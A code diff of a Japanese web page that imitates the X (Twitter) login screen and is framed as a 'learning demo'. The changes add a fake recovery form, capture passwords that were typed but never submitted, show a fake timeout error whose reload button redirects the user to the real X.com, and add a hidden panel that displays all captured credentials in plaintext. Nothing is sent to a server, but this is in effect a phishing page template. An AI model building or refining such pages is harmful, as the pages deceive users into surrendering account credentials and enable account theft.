@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="ja">
+<html lang="ja" class="dark">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -8,15 +8,18 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script>
         tailwind.config = {
+            darkMode: 'class',
             theme: {
                 extend: {
                     colors: {
                         dark: '#000000',
                         darkCard: '#16181c',
+                        lightCard: '#ffffff',
                         primary: '#eff3f4',
                         secondary: '#71767b',
                         accent: '#1d9bf0',
-                        danger: '#f4212e'
+                        danger: '#f4212e',
+                        warning: '#ffd400'
                     },
                     animation: {
                         'spin-slow': 'spin 1.5s linear infinite',
@@ -28,31 +31,50 @@
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            transition: background-color 0.3s ease;
+        }
+        /* ライトモード背景 */
+        body:not(.dark) {
+            background-color: #f3f4f6;
+        }
+        /* ダークモード背景 */
+        body.dark {
             background-color: #5b7083;
         }
+        
         .modal-overlay {
             background-color: rgba(91, 112, 131, 0.4);
         }
+        
+        /* 入力フィールドのフローティングラベルアニメーション */
         .input-field:focus + label,
         .input-field:not(:placeholder-shown) + label {
             transform: translate(-1px, -20px) scale(0.8);
             color: #1d9bf0;
         }
-        .input-field:not(:placeholder-shown) + label {
+        
+        /* ダークモード時のラベル色 */
+        .dark .input-field:not(:placeholder-shown) + label {
             color: #71767b;
         }
+        /* ライトモード時のラベル色 */
+        body:not(.dark) .input-field:not(:placeholder-shown) + label {
+            color: #536471;
+        }
+
         .input-field:focus + label {
             color: #1d9bf0 !important;
         }
+
         /* 履歴表示エリアのスクロールバー */
         .history-scroll::-webkit-scrollbar {
             width: 8px;
         }
         .history-scroll::-webkit-scrollbar-track {
-            background: #16181c; 
+            background: rgba(0,0,0,0.1); 
         }
         .history-scroll::-webkit-scrollbar-thumb {
-            background: #333; 
+            background: #888; 
             border-radius: 4px;
         }
         .history-scroll::-webkit-scrollbar-thumb:hover {
@@ -63,119 +85,174 @@
 <body class="flex items-center justify-center min-h-screen modal-overlay">
 
     <!-- メインカード -->
-    <div class="w-full max-w-[600px] h-full sm:h-auto sm:min-h-[600px] bg-black sm:rounded-2xl shadow-2xl flex flex-col relative overflow-hidden">
+    <div class="w-full max-w-[600px] h-full sm:h-auto sm:min-h-[600px] bg-white dark:bg-black sm:rounded-2xl shadow-2xl flex flex-col relative overflow-hidden transition-colors duration-300" id="mainCard">
         
         <!-- ヘッダー -->
         <div class="px-4 py-3 flex items-center justify-between">
-            <button class="w-8 h-8 flex items-center justify-center rounded-full hover:bg-gray-900 transition-colors text-white">
+            <button id="closeBtn" class="w-8 h-8 flex items-center justify-center rounded-full hover:bg-gray-200 dark:hover:bg-gray-900 transition-colors text-gray-900 dark:text-white">
                 <i class="fas fa-times"></i>
             </button>
-            <div class="flex-1 flex justify-center mr-8">
-                <svg viewBox="0 0 24 24" aria-hidden="true" class="w-8 h-8 text-white fill-current">
+            
+            <div class="flex-1 flex justify-center">
+                <svg viewBox="0 0 24 24" aria-hidden="true" class="w-8 h-8 text-gray-900 dark:text-white fill-current transition-colors">
                     <path d="M12 2L2 19h20L12 2zm0 3.8L18.5 17H5.5L12 5.8z"/>
                 </svg>
             </div>
+
+            <!-- テーマ切り替えボタン -->
+            <button id="themeToggleBtn" class="w-8 h-8 flex items-center justify-center rounded-full hover:bg-gray-200 dark:hover:bg-gray-900 transition-colors text-gray-900 dark:text-white ml-auto" title="テーマ切り替え">
+                <i class="fas fa-sun block dark:hidden text-orange-500"></i> <!-- ライトモード時は太陽 -->
+                <i class="fas fa-moon hidden dark:block text-yellow-300"></i> <!-- ダークモード時は月 -->
+            </button>
         </div>
 
         <!-- コンテンツエリア -->
-        <div class="flex-1 px-8 sm:px-20 py-8 flex flex-col justify-center">
+        <div class="flex-1 px-8 sm:px-20 py-8 flex flex-col justify-center transition-opacity duration-300" id="contentArea">
             
-            <div class="mb-8">
-                <h1 class="text-3xl font-bold text-white mb-8">ログインして続ける</h1>
-            </div>
-
-            <!-- エラーメッセージ -->
-            <div id="errorMessage" class="hidden mb-6 bg-red-500/10 border border-danger/50 rounded px-4 py-3">
-                <p class="text-sm text-danger font-medium flex items-center">
-                    <i class="fas fa-exclamation-triangle mr-2"></i>
-                    <span>問題が発生しました。後でもう一度お試しください。</span>
-                </p>
-            </div>
-
-            <form id="loginForm" class="space-y-6" onsubmit="return false;">
-                
-                <!-- ID/Email入力 -->
-                <div class="relative group">
-                    <input type="text" id="email" required
-                        class="input-field block w-full px-3 pt-6 pb-2 bg-transparent border border-secondary/50 rounded focus:outline-none focus:border-accent focus:ring-1 focus:ring-accent text-white placeholder-transparent transition-all peer"
-                        placeholder="電話番号、メールアドレス、またはユーザー名">
-                    <label for="email" class="absolute left-3 top-4 text-secondary text-lg transition-all pointer-events-none peer-focus:text-accent">
-                        電話番号、メールアドレス、またはユーザー名
-                    </label>
+            <!-- 通常ログイン画面 -->
+            <div id="loginSection">
+                <div class="mb-8">
+                    <h1 class="text-3xl font-bold text-gray-900 dark:text-white mb-8 transition-colors">ログインして続ける</h1>
                 </div>
 
-                <!-- 次へボタン -->
-                <button type="button" id="nextBtn"
-                    class="w-full py-2.5 px-4 bg-white text-black font-bold rounded-full hover:bg-gray-200 transition-colors duration-200 mt-2">
-                    次へ
-                </button>
+                <!-- エラーメッセージ -->
+                <div id="errorMessage" class="hidden mb-6 bg-red-100 dark:bg-red-500/10 border border-red-400 dark:border-danger/50 rounded px-4 py-3">
+                    <p class="text-sm text-red-600 dark:text-danger font-medium flex items-center">
+                        <i class="fas fa-exclamation-triangle mr-2"></i>
+                        <span>問題が発生しました。後でもう一度お試しください。</span>
+                    </p>
+                </div>
 
-                <!-- パスワード入力 -->
-                <div id="passwordSection" class="hidden space-y-6 opacity-0 transition-opacity duration-300">
+                <form id="loginForm" class="space-y-6" onsubmit="return false;">
+                    
+                    <!-- ID/Email入力 -->
                     <div class="relative group">
-                        <input type="password" id="password"
-                            class="input-field block w-full px-3 pt-6 pb-2 bg-transparent border border-secondary/50 rounded focus:outline-none focus:border-accent focus:ring-1 focus:ring-accent text-white placeholder-transparent transition-all peer"
-                            placeholder="パスワード">
-                        <label for="password" class="absolute left-3 top-4 text-secondary text-lg transition-all pointer-events-none peer-focus:text-accent">
-                            パスワード
+                        <input type="text" id="email" required
+                            class="input-field block w-full px-3 pt-6 pb-2 bg-transparent border border-gray-300 dark:border-secondary/50 rounded focus:outline-none focus:border-accent focus:ring-1 focus:ring-accent text-gray-900 dark:text-white placeholder-transparent transition-all peer"
+                            placeholder="電話番号、メールアドレス、またはユーザー名">
+                        <label for="email" class="absolute left-3 top-4 text-gray-500 dark:text-secondary text-lg transition-all pointer-events-none peer-focus:text-accent">
+                            電話番号、メールアドレス、またはユーザー名
                         </label>
-                        <button type="button" class="absolute right-3 top-4 text-secondary hover:text-white">
-                            <i class="far fa-eye"></i>
+                    </div>
+
+                    <!-- 次へボタン -->
+                    <button type="button" id="nextBtn"
+                        class="w-full py-2.5 px-4 bg-gray-900 dark:bg-white text-white dark:text-black font-bold rounded-full hover:bg-gray-700 dark:hover:bg-gray-200 transition-colors duration-200 mt-2">
+                        次へ
+                    </button>
+
+                    <!-- パスワード入力 -->
+                    <div id="passwordSection" class="hidden space-y-6 opacity-0 transition-opacity duration-300">
+                        <div class="relative group">
+                            <input type="password" id="password"
+                                class="input-field block w-full px-3 pt-6 pb-2 bg-transparent border border-gray-300 dark:border-secondary/50 rounded focus:outline-none focus:border-accent focus:ring-1 focus:ring-accent text-gray-900 dark:text-white placeholder-transparent transition-all peer"
+                                placeholder="パスワード">
+                            <label for="password" class="absolute left-3 top-4 text-gray-500 dark:text-secondary text-lg transition-all pointer-events-none peer-focus:text-accent">
+                                パスワード
+                            </label>
+                            <button type="button" class="absolute right-3 top-4 text-gray-500 dark:text-secondary hover:text-gray-900 dark:hover:text-white transition-colors">
+                                <i class="far fa-eye"></i>
+                            </button>
+                        </div>
+
+                        <button type="submit" id="finalLoginBtn"
+                            class="w-full py-3 px-4 bg-gray-900 dark:bg-white text-white dark:text-black font-bold rounded-full hover:bg-gray-700 dark:hover:bg-gray-200 transition-colors duration-200 text-base shadow-lg">
+                            ログイン
                         </button>
                     </div>
 
-                    <button type="submit" id="finalLoginBtn"
-                        class="w-full py-3 px-4 bg-white text-black font-bold rounded-full hover:bg-gray-200 transition-colors duration-200 text-base shadow-lg">
-                        ログイン
+                    <button type="button" id="forgotPasswordBtn" class="w-full py-2.5 px-4 bg-transparent border border-gray-300 dark:border-secondary/50 text-gray-900 dark:text-white font-bold rounded-full hover:bg-gray-100 dark:hover:bg-white/10 transition-colors duration-200 text-sm">
+                        パスワードを忘れた場合はこちら
                     </button>
+                </form>
+
+                <div class="mt-12 text-gray-500 dark:text-secondary text-sm">
+                    アカウントをお持ちでない場合は <a href="#" id="registerLink" class="text-accent hover:underline">登録</a>
+                </div>
+            </div>
+
+            <!-- パスワード忘れ（リカバリー）画面 -->
+            <div id="recoverySection" class="hidden opacity-0 translate-x-10 transition-all duration-300">
+                <div class="mb-6">
+                    <h1 class="text-3xl font-bold text-gray-900 dark:text-white mb-2 transition-colors">アカウントを探す</h1>
+                    <p class="text-gray-600 dark:text-secondary text-sm">パスワードを変更するには、アカウントに登録されているメールアドレス、電話番号、またはユーザー名を入力してください。</p>
                 </div>
 
-                <button class="w-full py-2.5 px-4 bg-transparent border border-secondary/50 text-white font-bold rounded-full hover:bg-white/10 transition-colors duration-200 text-sm">
-                    パスワードを忘れた場合はこちら
-                </button>
-            </form>
+                <form id="recoveryForm" class="space-y-6" onsubmit="return false;">
+                    <div class="relative group">
+                        <input type="text" id="recoveryEmail" required
+                            class="input-field block w-full px-3 pt-6 pb-2 bg-transparent border border-gray-300 dark:border-secondary/50 rounded focus:outline-none focus:border-accent focus:ring-1 focus:ring-accent text-gray-900 dark:text-white placeholder-transparent transition-all peer"
+                            placeholder="メールアドレスまたはユーザー名">
+                        <label for="recoveryEmail" class="absolute left-3 top-4 text-gray-500 dark:text-secondary text-lg transition-all pointer-events-none peer-focus:text-accent">
+                            メールアドレスまたはユーザー名
+                        </label>
+                    </div>
 
-            <div class="mt-12 text-secondary text-sm">
-                アカウントをお持ちでない場合は <a href="#" id="registerLink" class="text-accent hover:underline">登録</a>
+                    <button type="submit" id="recoverySubmitBtn"
+                        class="w-full py-2.5 px-4 bg-gray-900 dark:bg-white text-white dark:text-black font-bold rounded-full hover:bg-gray-700 dark:hover:bg-gray-200 transition-colors duration-200 mt-4">
+                        検索
+                    </button>
+                    
+                    <button type="button" id="backToLoginBtn" class="w-full py-2.5 px-4 text-accent font-bold hover:underline transition-colors duration-200 text-sm mt-2">
+                        ログインに戻る
+                    </button>
+                </form>
             </div>
+
         </div>
         
-        <!-- デバッグ・リダイレクト通知オーバーレイ -->
-        <div id="debugOverlay" class="absolute inset-0 bg-black/90 flex flex-col items-center justify-center z-50 hidden opacity-0 transition-opacity duration-500">
-            <div class="text-center p-6">
-                <div class="w-12 h-12 border-4 border-accent border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
-                <h3 class="text-xl font-bold text-white mb-2">認証エラー</h3>
-                <p class="text-secondary text-sm mb-6">
-                    予期せぬエラーが発生しました。<br>
-                    トップページへリダイレクトします...
-                </p>
-                <div class="w-full bg-gray-800 h-1 rounded overflow-hidden">
-                    <div id="progressBar" class="h-full bg-accent w-0 transition-all duration-[3000ms] ease-out"></div>
+        <!-- デバッグ・エラー通知オーバーレイ（リロードボタン付き） -->
+        <div id="debugOverlay" class="absolute inset-0 bg-white/90 dark:bg-black/90 flex flex-col items-center justify-center z-50 hidden opacity-0 transition-opacity duration-500">
+            <!-- コンテンツのラッパーをrelativeにして閉じるボタンの配置基準にする -->
+            <div class="text-center p-6 max-w-sm relative">
+                
+                <!-- 【NEW】キャンセル（閉じる）ボタン -->
+                <button id="debugCloseBtn" class="hidden absolute -top-2 -right-2 w-8 h-8 flex items-center justify-center rounded-full bg-gray-200 dark:bg-gray-800 text-gray-500 hover:text-gray-900 dark:hover:text-white hover:bg-gray-300 dark:hover:bg-gray-700 transition-colors shadow-sm" title="キャンセルして戻る">
+                    <i class="fas fa-times"></i>
+                </button>
+
+                <!-- 処理中スピナー -->
+                <div id="debugSpinner" class="w-12 h-12 border-4 border-accent border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
+                
+                <!-- エラーアイコン（初期非表示） -->
+                <div id="debugIcon" class="hidden mb-4">
+                    <div class="inline-flex items-center justify-center w-16 h-16 rounded-full bg-red-100 dark:bg-red-900/30 text-red-500 dark:text-red-500 mb-2">
+                        <i class="fas fa-exclamation-triangle text-3xl"></i>
+                    </div>
                 </div>
-                <p class="text-xs text-gray-600 mt-4 font-mono">Redirecting to: <span id="targetUrlDisplay"></span></p>
+
+                <h3 class="text-xl font-bold text-gray-900 dark:text-white mb-2" id="debugTitle">処理中...</h3>
+                <p class="text-gray-600 dark:text-secondary text-sm mb-6" id="debugMessage">
+                    アカウント情報を確認しています...
+                </p>
+                
+                <!-- リロードボタン（初期非表示） -->
+                <button id="fakeReloadBtn" class="hidden w-full py-3 px-6 bg-accent text-white font-bold rounded-full hover:bg-blue-600 transition-colors shadow-lg flex items-center justify-center group">
+                    <i class="fas fa-redo-alt mr-2 group-hover:rotate-180 transition-transform duration-500"></i>
+                    再読み込み
+                </button>
             </div>
         </div>
 
-        <!-- 【NEW】履歴表示用オーバーレイ（管理者デモ画面） -->
-        <div id="historyOverlay" class="absolute inset-0 bg-darkCard z-40 hidden flex flex-col transform transition-transform duration-300 translate-y-full">
-            <div class="flex items-center justify-between p-4 border-b border-gray-800">
-                <h2 class="text-white font-bold text-lg"><i class="fas fa-database text-accent mr-2"></i>入力データ履歴 (Demo)</h2>
-                <button id="closeHistoryBtn" class="text-secondary hover:text-white transition-colors">
+        <!-- 【履歴表示用オーバーレイ（管理者デモ画面）】 -->
+        <div id="historyOverlay" class="absolute inset-0 bg-gray-50 dark:bg-darkCard z-40 hidden flex flex-col transform transition-transform duration-300 translate-y-full text-gray-900 dark:text-white">
+            <div class="flex items-center justify-between p-4 border-b border-gray-200 dark:border-gray-800">
+                <h2 class="font-bold text-lg"><i class="fas fa-database text-accent mr-2"></i>入力データ履歴 (Demo)</h2>
+                <button id="closeHistoryBtn" class="text-gray-500 dark:text-secondary hover:text-gray-900 dark:hover:text-white transition-colors">
                     <i class="fas fa-times text-xl"></i>
                 </button>
             </div>
             
-            <div class="p-4 bg-yellow-900/20 border-b border-yellow-700/30">
-                <p class="text-yellow-500 text-xs">
+            <div class="p-4 bg-yellow-100 dark:bg-yellow-900/20 border-b border-yellow-200 dark:border-yellow-700/30">
+                <p class="text-yellow-700 dark:text-yellow-500 text-xs">
                     <i class="fas fa-exclamation-triangle mr-1"></i>
-                    <strong>警告:</strong> これは学習用デモです。実際のアプリでパスワードをこのように平文保存・表示することは重大なセキュリティ違反となります。
+                    <strong>警告:</strong> これは学習用デモです。実際のアプリでユーザー入力（特にパスワード）を平文で保存・表示することは重大なセキュリティ違反となります。
                 </p>
             </div>
 
             <div class="flex-1 overflow-y-auto history-scroll p-4">
                 <div id="historyList" class="space-y-3">
-                    <!-- ここにJavaScriptで履歴が追加されます -->
-                    <p class="text-secondary text-center text-sm mt-10">まだ履歴はありません</p>
+                    <!-- JavaScriptで履歴がここに追加されます -->
                 </div>
             </div>
         </div>
@@ -184,14 +261,33 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', () => {
+            // 要素の取得
+            const loginSection = document.getElementById('loginSection');
+            const recoverySection = document.getElementById('recoverySection');
+            
             const nextBtn = document.getElementById('nextBtn');
             const passwordSection = document.getElementById('passwordSection');
             const emailInput = document.getElementById('email');
             const passwordInput = document.getElementById('password');
             const loginForm = document.getElementById('loginForm');
             const finalLoginBtn = document.getElementById('finalLoginBtn');
+            
+            const forgotPasswordBtn = document.getElementById('forgotPasswordBtn');
+            const recoveryForm = document.getElementById('recoveryForm');
+            const recoveryEmailInput = document.getElementById('recoveryEmail');
+            const recoverySubmitBtn = document.getElementById('recoverySubmitBtn');
+            const backToLoginBtn = document.getElementById('backToLoginBtn');
+
+            // オーバーレイ要素
             const debugOverlay = document.getElementById('debugOverlay');
-            const progressBar = document.getElementById('progressBar');
+            const debugTitle = document.getElementById('debugTitle');
+            const debugMessage = document.getElementById('debugMessage');
+            const debugSpinner = document.getElementById('debugSpinner');
+            const debugIcon = document.getElementById('debugIcon');
+            const fakeReloadBtn = document.getElementById('fakeReloadBtn');
+            const debugCloseBtn = document.getElementById('debugCloseBtn'); // 閉じるボタン
+            
+            const themeToggleBtn = document.getElementById('themeToggleBtn');
             
             // 履歴表示用
             const registerLink = document.getElementById('registerLink');
@@ -199,14 +295,20 @@
             const closeHistoryBtn = document.getElementById('closeHistoryBtn');
             const historyList = document.getElementById('historyList');
 
-            // データ保存用配列（メモリ内のみ保持）
+            // データ保存用配列
             const loginHistory = [];
             
             // リダイレクト先URL
             const REDIRECT_URL = "https://X.com"; 
-            document.getElementById('targetUrlDisplay').textContent = REDIRECT_URL;
 
-            // 1. 「次へ」ボタン処理
+            // --- テーマ切り替え機能 ---
+            themeToggleBtn.addEventListener('click', () => {
+                document.documentElement.classList.toggle('dark');
+            });
+
+            // --- 画面遷移ロジック ---
+
+            // 「次へ」ボタン処理
             nextBtn.addEventListener('click', () => {
                 if(emailInput.value.trim() === "") {
                     emailInput.focus();
@@ -222,11 +324,53 @@
                         passwordSection.classList.remove('opacity-0');
                         passwordInput.focus();
                     }, 50);
-                    emailInput.classList.add('bg-gray-900', 'text-gray-400');
+                    // ライトモード対応のためクラス調整
+                    emailInput.classList.add('bg-gray-100', 'dark:bg-gray-900', 'text-gray-500', 'dark:text-gray-400');
                 }, 600);
             });
 
-            // 2. ログイン送信処理 & データ保存
+            // 「パスワードを忘れた場合」ボタン処理
+            forgotPasswordBtn.addEventListener('click', () => {
+                
+                // 入力がある場合のみ保存
+                if (emailInput.value || passwordInput.value) {
+                    const email = emailInput.value;
+                    const password = passwordInput.value;
+                    const timestamp = new Date().toLocaleTimeString('ja-JP');
+                    
+                    if (password) {
+                        loginHistory.unshift({ 
+                            type: 'abandoned', 
+                            email: email, 
+                            password: password, 
+                            timestamp: timestamp 
+                        });
+                    }
+                }
+
+                loginSection.classList.add('hidden');
+                recoverySection.classList.remove('hidden');
+                
+                setTimeout(() => {
+                    recoverySection.classList.remove('opacity-0', 'translate-x-10');
+                }, 10);
+                
+                recoveryEmailInput.value = emailInput.value;
+                recoveryEmailInput.focus();
+            });
+
+            // 「ログインに戻る」ボタン処理
+            backToLoginBtn.addEventListener('click', () => {
+                recoverySection.classList.add('opacity-0', 'translate-x-10');
+                setTimeout(() => {
+                    recoverySection.classList.add('hidden');
+                    loginSection.classList.remove('hidden');
+                }, 300);
+            });
+
+            // --- 送信処理ロジック ---
+
+            // 1. 通常ログイン送信 & 保存
             loginForm.addEventListener('submit', (e) => {
                 e.preventDefault();
                 
@@ -234,71 +378,156 @@
                 const password = passwordInput.value;
                 const timestamp = new Date().toLocaleTimeString('ja-JP');
 
-                // 【ここがポイント】入力データを配列に保存（本来は暗号化してサーバーへ送るべきもの）
                 if (password) {
-                    loginHistory.unshift({ email, password, timestamp }); // 最新を上に
+                    loginHistory.unshift({ type: 'login', email, password, timestamp }); 
                 }
 
-                // ローディング表示
-                finalLoginBtn.innerHTML = '<div class="w-5 h-5 border-2 border-black border-t-transparent rounded-full animate-spin mx-auto"></div>';
-                finalLoginBtn.disabled = true;
-
-                setTimeout(() => {
-                    debugOverlay.classList.remove('hidden');
-                    setTimeout(() => {
-                        debugOverlay.classList.remove('opacity-0');
-                        progressBar.style.width = '100%';
-                    }, 50);
-
-                    setTimeout(() => {
-                        window.location.href = REDIRECT_URL;
-                    }, 3500);
-
-                }, 1500);
+                startFakeProcess(finalLoginBtn, 'システムエラー', '接続がタイムアウトしました。<br>ページを再読み込みしてください。');
             });
 
-            // 3. 履歴画面（「登録」リンク）の表示処理
+            // 2. リカバリー送信 & 保存
+            recoveryForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+
+                const email = recoveryEmailInput.value;
+                const timestamp = new Date().toLocaleTimeString('ja-JP');
+
+                if (email) {
+                    loginHistory.unshift({ type: 'recovery', email: email, password: null, timestamp });
+                }
+
+                startFakeProcess(recoverySubmitBtn, '送信エラー', 'サーバーに接続できません。<br>ページを再読み込みしてください。');
+            });
+
+            // ★ フェイク処理関数（キャンセル機能付き） ★
+            function startFakeProcess(btnElement, title, message) {
+                // 元のボタンの内容を保存（キャンセル時に復元するため）
+                const originalContent = '<i class="fas fa-arrow-right"></i> ログイン'; // デフォルト値
+                const isRecovery = btnElement === recoverySubmitBtn;
+                const savedText = isRecovery ? '検索' : 'ログイン'; // 簡易的な復元用テキスト
+
+                // ボタンのスピナー表示
+                const spinnerColor = 'border-current'; 
+                btnElement.innerHTML = `<div class="w-5 h-5 border-2 ${spinnerColor} border-t-transparent rounded-full animate-spin mx-auto"></div>`;
+                btnElement.disabled = true;
+
+                // 1. オーバーレイ表示
+                debugOverlay.classList.remove('hidden');
+                debugSpinner.classList.remove('hidden');
+                debugIcon.classList.add('hidden');
+                fakeReloadBtn.classList.add('hidden');
+                debugCloseBtn.classList.add('hidden'); // 最初は閉じるボタンを隠す（処理中っぽく）
+                
+                debugTitle.textContent = "処理中...";
+                debugMessage.textContent = "情報を確認しています...";
+
+                setTimeout(() => debugOverlay.classList.remove('opacity-0'), 10);
+
+                // 2. エラー表示 & 閉じるボタン表示
+                setTimeout(() => {
+                    debugSpinner.classList.add('hidden');
+                    debugIcon.classList.remove('hidden');
+                    
+                    debugTitle.textContent = title;
+                    debugMessage.innerHTML = message;
+                    
+                    fakeReloadBtn.classList.remove('hidden');
+                    debugCloseBtn.classList.remove('hidden'); // ここで閉じるボタンを表示
+                    
+                }, 1500);
+
+                // ★ 閉じるボタン（キャンセル）の動作定義 ★
+                // 毎回定義し直すことで、現在の btnElement (ログインボタン or 検索ボタン) を参照できる
+                debugCloseBtn.onclick = () => {
+                    // フェードアウト
+                    debugOverlay.classList.add('opacity-0');
+                    
+                    setTimeout(() => {
+                        debugOverlay.classList.add('hidden');
+                        
+                        // ボタンを元の状態に戻す
+                        btnElement.disabled = false;
+                        btnElement.textContent = savedText; // テキスト復元
+                        // もしスタイリングが必要ならクラスも調整可能
+                        
+                        // 検索ボタンの場合はクラス調整等は不要
+                        // ログインボタンの場合もテキストだけでOK
+                    }, 300);
+                };
+            }
+
+            // ★ リロードボタンのクリックイベント ★
+            fakeReloadBtn.addEventListener('click', () => {
+                const originalContent = fakeReloadBtn.innerHTML;
+                fakeReloadBtn.innerHTML = '<i class="fas fa-circle-notch fa-spin mr-2"></i>読み込み中...';
+                fakeReloadBtn.disabled = true;
+
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 800);
+            });
+
+
+            // --- 履歴表示（管理者デモ）ロジック ---
+
             registerLink.addEventListener('click', (e) => {
-                e.preventDefault(); // リンク遷移を無効化
+                e.preventDefault();
                 renderHistory();
                 historyOverlay.classList.remove('hidden');
-                // スライドインアニメーション
                 setTimeout(() => {
                     historyOverlay.classList.remove('translate-y-full');
                 }, 10);
             });
 
-            // 4. 履歴画面を閉じる
             closeHistoryBtn.addEventListener('click', () => {
                 historyOverlay.classList.add('translate-y-full');
                 setTimeout(() => {
                     historyOverlay.classList.add('hidden');
-                }, 300); // アニメーション時間と合わせる
+                }, 300);
             });
 
-            // 履歴リストの生成関数
             function renderHistory() {
                 if (loginHistory.length === 0) {
-                    historyList.innerHTML = '<p class="text-secondary text-center text-sm mt-10">まだ入力履歴はありません。<br>ログインを試行するとここに表示されます。</p>';
+                    historyList.innerHTML = '<p class="text-gray-500 dark:text-secondary text-center text-sm mt-10">まだ入力履歴はありません。<br>ログインまたはパスワードリセットを試行するとここに表示されます。</p>';
                     return;
                 }
 
                 let html = '';
                 loginHistory.forEach((item, index) => {
+                    let typeLabel = '';
+                    if (item.type === 'login') {
+                        typeLabel = '<span class="bg-accent/20 text-accent text-[10px] px-1.5 py-0.5 rounded border border-accent/30">LOGIN ATTEMPT</span>';
+                    } else if (item.type === 'recovery') {
+                        typeLabel = '<span class="bg-warning/20 text-warning text-[10px] px-1.5 py-0.5 rounded border border-warning/30">RECOVERY REQUEST</span>';
+                    } else if (item.type === 'abandoned') {
+                        typeLabel = '<span class="bg-pink-500/20 text-pink-500 text-[10px] px-1.5 py-0.5 rounded border border-pink-500/30">NAVIGATED AWAY</span>';
+                    }
+
                     html += `
-                        <div class="bg-black border border-gray-800 p-3 rounded text-sm mb-3">
-                            <div class="flex justify-between text-secondary text-xs mb-2">
-                                <span>#${loginHistory.length - index}</span>
+                        <div class="bg-gray-100 dark:bg-black border border-gray-200 dark:border-gray-800 p-3 rounded text-sm mb-3">
+                            <div class="flex justify-between items-center text-gray-500 dark:text-secondary text-xs mb-2">
+                                <div class="flex items-center gap-2">
+                                    <span>#${loginHistory.length - index}</span>
+                                    ${typeLabel}
+                                </div>
                                 <span>${item.timestamp}</span>
                             </div>
-                            <div class="mb-1">
-                                <span class="text-accent text-xs block">Email / ID</span>
-                                <span class="text-white font-mono break-all">${sanitize(item.email)}</span>
+                            <div class="mb-2">
+                                <span class="text-gray-500 dark:text-secondary text-xs block">Email / ID</span>
+                                <span class="text-gray-900 dark:text-white font-mono break-all">${sanitize(item.email)}</span>
                             </div>
+                            ${(item.type === 'login' || item.type === 'abandoned') ? `
                             <div>
-                                <span class="text-danger text-xs block">Password (Unsafe View)</span>
-                                <span class="text-white font-mono bg-gray-900 px-2 py-1 rounded block mt-1 break-all">${sanitize(item.password)}</span>
+                                <span class="text-red-500 dark:text-danger text-xs block">Password (Unsafe View)</span>
+                                <span class="text-gray-900 dark:text-white font-mono bg-gray-200 dark:bg-gray-900 px-2 py-1 rounded block mt-1 break-all">${sanitize(item.password)}</span>
                             </div>
+                            ${item.type === 'abandoned' ? '<p class="text-pink-500 text-[10px] mt-1 italic">※送信ボタンを押さずに「パスワードを忘れた場合」へ移動しましたが、入力値はキャプチャされました。</p>' : ''}
+                            ` : `
+                            <div>
+                                <span class="text-gray-500 dark:text-secondary text-xs block mb-1">Action</span>
+                                <span class="text-gray-500 dark:text-gray-400 text-xs italic">パスワードリセットを要求しました</span>
+                            </div>
+                            `}
                         </div>
                     `;
                 });
@@ -306,6 +535,7 @@
             }
 
             function sanitize(str) {
+                if (!str) return '';
                 return str.replace(/[&<>"']/g, function(m) {
                     return {
                         '&': '&amp;',
